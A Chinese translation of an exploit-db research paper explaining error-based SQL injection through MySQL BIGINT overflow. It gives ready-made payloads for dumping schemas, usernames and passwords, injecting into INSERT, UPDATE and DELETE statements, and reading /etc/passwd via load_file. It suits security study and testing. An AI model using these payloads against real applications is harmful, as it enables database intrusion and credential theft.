本文译自[https://www.exploit-db.com/docs/37733.pdf](https://www.exploit-db.com/docs/37733.pdf)  
----
#<center>BIGINT Overflow Error Based SQL Injection</center>  
<center>Osanda Malith Jayathissa</center>  
<center>(@OsandaMalith)</center>  
##概述  
我乐于去寻找能够通过MySQL错误消息来提取数据的新技术。当我关注MySQL如何对整数进行处理时，我对溢出产生了兴趣。下面我们来看看MySQL如何存储整数。  
>| Type       | Storage   | Minimum Value        | Maximum Value         |  
>|:----------:|:---------:|---------------------:|----------------------:|  
>|            | (Bytes)   | (Signed/Unsigned)    | (Signed/Unsigned)     |  
>| TINYINT    | 1         | -128                 | 127                   |  
>|            |           | 0                    | 255                   |  
>| SMALLINT   | 2         | -32768               | 32767                 |  
>|            |           | 0                    | 65535                 |  
>| MEDIUMINT  | 3         | -8388608             | 8388607               |  
>|            |           | 0                    | 16777215              |  
>| INT        | 4         | -2147483648          | 2147483647            |   
>|            |           | 0                    | 4294967295            |   
>| BIGINT     | 8         | -9223372036854775808 | 9223372036854775807   |  
>|            |           | 0                    | 18446744073709551615  |   

(Source: [http://dev.mysql.com/doc/refman/5.5/en/integer-types.html](http://dev.mysql.com/doc/refman/5.5/en/integer-types.html))  
溢出错误消息会在MySQL5.5.5及以上出现，低于此版本不会出现错误消息。  
BIGINT类型的长度为8字节(64bit)。此数据类型的最大有符号值用二进制、十六进制和十进制表示分别为“0b0111111111111111111111111111111111111111111111111111111111111111”，“0x7fffffffffffffff”和“9223372036854775807”。 一旦我们用这个值进行某些数学运算时，比如加法运算，就会引起“BIGINT value is out of range”错误。  

    mysql> select 9223372036854775807+1;
    ERROR 1690 (22003): BIGINT value is out of range in '(9223372036854775807 + 1)'  

为了避免出现上面的错误，我们可以将其转换为无符号整数。
对于无符号整数来说，BIGINT数据类型的最大无符号值用二进制、十六进制和十进制表示的话，分别为“0b1111111111111111111111111111111111111111111111111111111111111111”、“0xFFFFFFFFFFFFFFFF”和“18446744073709551615”。同样的，如果对这个值进行数学运算，如加法或减法运算，也会导致“BIGINT value is out of range”错误。  

    # In decimal
    mysql> select 18446744073709551615+1;
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(18446744073709551615 + 1)'
    # In binary
    mysql> select
    cast(b'1111111111111111111111111111111111111111111111111111111111111111' as
    unsigned)+1;
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(cast(0xffffffffffffffff as unsigned)
    + 1)'
    # In hex
    mysql> select cast(x'FFFFFFFFFFFFFFFF' as unsigned)+1;
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(cast(0xffffffffffffffff as unsigned)
    + 1)'  
    
如果我们对0按位取反，会发生什么呢？显而易见，会返回一个最大的无符号BIGINT类型的值。  

    mysql> select ~0;
    +----------------------+
    | ~0                   |
    +----------------------+
    | 18446744073709551615 |
    +----------------------+
    1 row in set (0.00 sec)  
    
所以，如果我们对~0进行加减运算，也会导致BIGINT溢出错误。  

    mysql> select 1-~0;
    ERROR 1690 (22003): BIGINT value is out of range in '(1 - ~(0))'
    mysql> select 1+~0;
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(1 + ~(0))'    
    
##注入  
我想利用子查询造成BIGINT溢出来获取数据。因为执行成功的查询语句会返回0，所以对于任何成功查询进行逻辑非操作会返回1。举例来说，如果我们对类似(select*from(select user())x)这样的查询进行逻辑非的话，就会这样：  

    mysql> select (select*from(select user())x);
    +-------------------------------+
    | (select*from(select user())x) |
    +-------------------------------+
    | root@localhost                |
    +-------------------------------+
    1 row in set (0.00 sec)
    # Applying logical negation
    mysql> select !(select*from(select user())x);
    +--------------------------------+
    | !(select*from(select user())x) |
    +--------------------------------+
    | 1                              |
    +--------------------------------+
    1 row in set (0.00 sec)
    
Yeah, perfect! 所以只要我们能够将按位取反和逻辑非运算进行组合就能进行基于错误信息的注入。  

    mysql> select ~0+!(select*from(select user())x);
    ERROR 1690 (22003): BIGINT value is out of range in '(~(0) + (not((select 'root@localhost' from
    dual))))'  
    
我们先不使用加法，因为”+“在浏览器解析时会被转换为空白符(可以使用%2b来代替+)。相反我们来使用减法。有不同的注入方法可以达到相同的目的。最终的查询语句如下所：  

    !(select*from(select user())x)-~0
    (select(!x-~0)from(select(select user())x)a)
    (select!x-~0.from(select(select user())x)a)  
    
举个栗子，我们可以像这样在查询语句中进行注入。  

    mysql> select username, password from users where id='1' or !(select*from(select user())x)-~0;
    ERROR 1690 (22003): BIGINT value is out of range in '((not((select 'root@localhost' from dual))) -
    ~(0))'  
    
使用这种基于BIGINT类型溢出错误的注入方式，我们可以使用几乎所有的MySQL数学函数。就像下面这样  

    select !atan((select*from(select user())a))-~0;
    select !ceil((select*from(select user())a))-~0;
    select !floor((select*from(select user())a))-~0;  
    
我已经测试过下面这些了，你还可以找到更多。  

    HEX
    FLOOR
    CEIL
    RAND
    CEILING
    TRUNCATE
    TAN
    SQRT
    ROUND
    SIGN  
    
##提取数据  
提取数据的方法和其他注入一样，简单地说一下。  
####Getting table names:  

    !(select*from(select table_name from information_schema.tables where
    table_schema=database() limit 0,1)x)-~0;  
    
####Getting column names:  

    select !(select*from(select column_name from information_schema.columns where
    table_name='users' limit 0,1)x)-~0;  
    
####Retrieving Data:  

    !(select*from(select concat_ws(':',id, username, password) from users limit 0,1)x)-~0;

##Dump in One Shot  
我们能够一次性dump所有数据库、列和表吗？答案是肯定的。但是，当我们试图从所有数据库中dump表和列时，我们只能得到较少的结果，因为我们是通过错误信息来获取数据的。不过从当前数据库中dump数据时，我们可以获得最多27个结果。下面举例说明。  

    !(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where
    table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,colum
    n_name)),@)))x)-~0  
    
    (select(!x-~0)from(select(concat (@:=0,(select count(*)from`information_schema`.columns
    where table_schema=database()and@:=concat(@,0xa,table_name,0x3a3a,column_name)),@))x)a)  
    
    (select!x-~0.from(select(concat (@:=0,(select count(*)from`information_schema`.columns where
    table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a)    
    
我们可以获取的结果数量被限制了，最多27个。假设，我们在一个数据库中创建了一个31列的表。只能看到27个结果会被看到，其他4个表和用户表的其他列都无法返回。  

##在insert语句中注入  
在插入语句中我们可以像这样注入。不过payload有可能插入到引号中，这依赖于查询语句。你可以看看我以前的研究。  
[https://osandamalith.wordpress.com/2014/04/26/injection-in-insert-update-and-delete-statements/](https://osandamalith.wordpress.com/2014/04/26/injection-in-insert-update-and-delete-statements/)  
[http://www.exploit-db.com/wp-content/themes/exploit/docs/33253.pdf](http://www.exploit-db.com/wp-content/themes/exploit/docs/33253.pdf)  

    mysql> insert into users (id, username, password) values (2, '' or !(select*from(select user())x)-~0
    or '', 'Eyre');
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'root@localhost'
    from dual))) - ~(0))'  

我们还可以使用DIOS(Dump In One Shot)  

    mysql> insert into users (id, username, password) values (2, '' or
    !(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where
    table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,colum
    n_name)),@)))x)-~0 or '', 'Eyre');
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '000
    newdb::users::id
    newdb::users::username
    newdb::users::password' from dual))) - ~(0))'  
    
##在update语句中注入  
和insert语句注入类似，如下  

    mysql> update users set password='Peter' or !(select*from(select user())x)-~0 or '' where id=4;
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'root@localhost'
    from dual))) - ~(0))'  
    
##在delete语句中注入  

    mysql> delete from users where id='1' or !(select*from(select user())x)-~0 or '';
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'root@localhost'
    from dual))) - ~(0))'  
    
##读取文件  
你可以利用load_file()函数来读取文件，但我提醒你它有13行的限制。  

    mysql> select !(select*from(select load_file('/etc/passwd'))x)-~0;
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/u
    mysql> 

但是你不能写入文件。因为发生错误时，只会写入0。  

    mysql> select !(select*from(select 'hello')x)-~0 into outfile 'C:/out.txt';
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'hello' from dual))) -
    ~(0))'
    # type C:\out.txt
    0  
    
##小结  
请记住下面的内容。为了使攻击成功，mysql_error()必须可以向我们回显错误信息(基于错误的注入攻击)。MySQL的版本要在5.5.5及以上。有许多姿势可以造成溢出注入攻击。举个栗子，将0和某数(如222)进行异或作为减数也可以造成BIGINT OVERFLOW。  

    mysql> select !1-0^222;
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not(1)) - (0 ^ 222))'
    mysql> select !(select*from(select user())a)-0^222;
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'root@localhost'
    from dual))) - (0 ^ 222))'  

##References
[1][http://dev.mysql.com/doc/refman/5.5/en/integer-types.html](http://dev.mysql.com/doc/refman/5.5/en/integer-types.html)
[2][https://dev.mysql.com/doc/refman/5.0/en/numeric-type-overview.html](https://dev.mysql.com/doc/refman/5.0/en/numeric-type-overview.html)
[3][https://dev.mysql.com/doc/refman/5.0/en/mathematical-functions.html](https://dev.mysql.com/doc/refman/5.0/en/mathematical-functions.html)
    
##作者的博客  
[https://osandamalith.wordpress.com/](https://osandamalith.wordpress.com/)